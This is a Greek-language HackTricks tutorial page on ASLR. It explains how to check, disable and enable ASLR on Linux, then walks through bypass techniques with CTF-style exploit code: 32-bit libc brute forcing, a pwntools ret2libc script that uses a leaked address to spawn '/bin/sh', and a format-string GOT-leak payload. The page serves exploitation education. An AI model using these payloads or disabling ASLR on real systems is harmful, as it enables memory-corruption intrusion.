# ASLR

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.

</details>

## Βασικές Πληροφορίες

Το **Address Space Layout Randomization (ASLR)** είναι μια τεχνική ασφαλείας που χρησιμοποιείται σε λειτουργικά συστήματα για το **τυχαίο ανακάτεμα των διευθύνσεων μνήμης** που χρησιμοποιούνται από τις διεργασίες του συστήματος και των εφαρμογών. Με αυτόν τον τρόπο, κάνει σημαντικά πιο δύσκολο για έναν εισβολέα να προβλέψει τη θέση συγκεκριμένων διεργασιών και δεδομένων, όπως το stack, το heap και οι βιβλιοθήκες, με αποτέλεσμα τη μείωση ορισμένων τύπων εκμετάλλευσης, ιδιαίτερα των buffer overflows.

### **Έλεγχος Κατάστασης ASLR**

Για να **ελέγξετε** την κατάσταση του ASLR σε ένα σύστημα Linux, μπορείτε να διαβάσετε την τιμή από το αρχείο `/proc/sys/kernel/randomize_va_space`. Η τιμή που αποθηκεύεται σε αυτό το αρχείο καθορίζει τον τύπο του ASLR που εφαρμόζεται:

* **0**: Χωρίς τυχαιοποίηση. Όλα είναι στατικά.
* **1**: Συντηρητική τυχαιοποίηση. Οι κοινόχρηστες βιβλιοθήκες, το stack, το mmap(), η σελίδα VDSO τυχαιοποιούνται.
* **2**: Πλήρης τυχαιοποίηση. Εκτός από τα στοιχεία που τυχαιοποιούνται από τη συντηρητική τυχαιοποίηση, η μνήμη που διαχειρίζεται μέσω της `brk()` τυχαιοποιείται.

Μπορείτε να ελέγξετε την κατάσταση του ASLR με την ακόλουθη εντολή:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Απενεργοποίηση του ASLR**

Για να **απενεργοποιήσετε** το ASLR, ορίζετε την τιμή του `/proc/sys/kernel/randomize_va_space` σε **0**. Η απενεργοποίηση του ASLR συνήθως δεν συνιστάται εκτός από περιπτώσεις ελέγχου ή αποσφαλμάτωσης. Ακολουθεί πως μπορείτε να το απενεργοποιήσετε:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Μπορείτε επίσης να απενεργοποιήσετε το ASLR για μια εκτέλεση με:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Ενεργοποίηση του ASLR**

Για να **ενεργοποιήσετε** το ASLR, μπορείτε να γράψετε μια τιμή **2** στο αρχείο `/proc/sys/kernel/randomize_va_space`. Αυτό απαιτεί συνήθως δικαιώματα ριζού. Η ενεργοποίηση πλήρους τυχαίοποίησης μπορεί να γίνει με την ακόλουθη εντολή:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Μόνιμη Διατήρηση Μετά την Επανεκκίνηση**

Οι αλλαγές που γίνονται με τις εντολές `echo` είναι προσωρινές και θα επαναφερθούν μετά από επανεκκίνηση. Για να κάνετε την αλλαγή μόνιμη, πρέπει να επεξεργαστείτε το αρχείο `/etc/sysctl.conf` και να προσθέσετε ή να τροποποιήσετε την παρακάτω γραμμή:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Μετά την επεξεργασία του `/etc/sysctl.conf`, εφαρμόστε τις αλλαγές με:
```bash
sudo sysctl -p
```
Αυτό θα εξασφαλίσει ότι οι ρυθμίσεις του ASLR παραμένουν μετά την επανεκκίνηση.

## **Παρακάμψεις**

### Βίαιη εξαναγκαστική επίθεση 32bit

Το PaX διαιρεί τον χώρο διεύθυνσης της διεργασίας σε **3 ομάδες**:

* **Κώδικας και δεδομένα** (αρχικοποιημένα και μη αρχικοποιημένα): `.text`, `.data`, και `.bss` —> **16 bits** εντροπία στη μεταβλητή `delta_exec`. Αυτή η μεταβλητή αρχικοποιείται τυχαία με κάθε διεργασία και προστίθεται στις αρχικές διευθύνσεις.
* **Μνήμη** που εκχωρείται από την `mmap()` και **κοινόχρηστες βιβλιοθήκες** —> **16 bits**, με το όνομα `delta_mmap`.
* **Η στοίβα** —> **24 bits**, αναφέρεται ως `delta_stack`. Ωστόσο, χρησιμοποιεί πραγματικά **11 bits** (από τον 10ο έως τον 20ο byte συμπεριλαμβανομένου), ευθυγραμμισμένα σε **16 bytes** —> Αυτό οδηγεί σε **524,288 πιθανές πραγματικές διευθύνσεις στοίβας**.

Τα προηγούμενα δεδομένα αφορούν συστήματα 32-bit και η μειωμένη τελική εντροπία καθιστά δυνατή την παράκαμψη του ASLR με επαναλαμβανόμενη εκτέλεση μέχρι η εκμετάλλευση να ολοκληρωθεί με επιτυχία.

#### Ιδέες για βίαιη εξαναγκαστική επίθεση:

* Αν η εκμετάλλευση είναι τοπική, μπορείτε να δοκιμάσετε βίαιη εξαναγκαστική επίθεση στη βάση της διεύθυνσης της βιβλιοθήκης libc (χρήσιμο για συστήματα 32bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Εάν επιτεθείτε σε ένα απομακρυσμένο διακομιστή, μπορείτε να δοκιμάσετε να **δοκιμάσετε με βία τη διεύθυνση της συνάρτησης `usleep` της `libc`**, περνώντας ως όρισμα τον αριθμό 10 (για παράδειγμα). Εάν σε κάποιο σημείο ο **διακομιστής χρειάζεται 10 δευτερόλεπτα παραπάνω για να ανταποκριθεί**, τότε βρήκατε τη διεύθυνση αυτής της συνάρτησης.

{% hint style="success" %}
Στα 64bit συστήματα η εντροπία είναι πολύ υψηλότερη και αυτό δεν είναι δυνατό.
{% endhint %}

### Έχοντας ένα διαρροή

* **Η πρόκληση είναι να δοθεί μια διαρροή**

Εάν σας δίνεται μια διαρροή (εύκολες προκλήσεις CTF), μπορείτε να υπολογίσετε τις μετατοπίσεις από αυτήν (υποθέτοντας για παράδειγμα ότι γνωρίζετε την ακριβή έκδοση της `libc` που χρησιμοποιείται στο σύστημα που εκμεταλλεύεστε). Αυτό το παράδειγμα εκμετάλλευσης εξάγεται από το [**παράδειγμα από εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (ελέγξτε αυτήν τη σελίδα για περισσότερες λεπτομέρειες):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Καταχρώντας ένα buffer overflow θα ήταν δυνατό να εκμεταλλευτείτε ένα **ret2plt** για να εξαγάγετε μια διεύθυνση μιας συνάρτησης από την libc. Ελέγξτε:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Όπως και στο ret2plt, αν έχετε ένα αυθαίρετο διάβασμα μέσω μιας ευπάθειας format strings είναι δυνατό να εξάγετε τη διεύθυνση μιας **συνάρτησης της libc** από το GOT. Το ακόλουθο [**παράδειγμα είναι από εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Μπορείτε να βρείτε περισσότερες πληροφορίες σχετικά με την αυθαίρετη ανάγνωση μορφοποίησης στο:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret

Προσπαθήστε να παρακάμψετε το ASLR καταχρώμενοι διευθύνσεις μέσα στο stack:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}
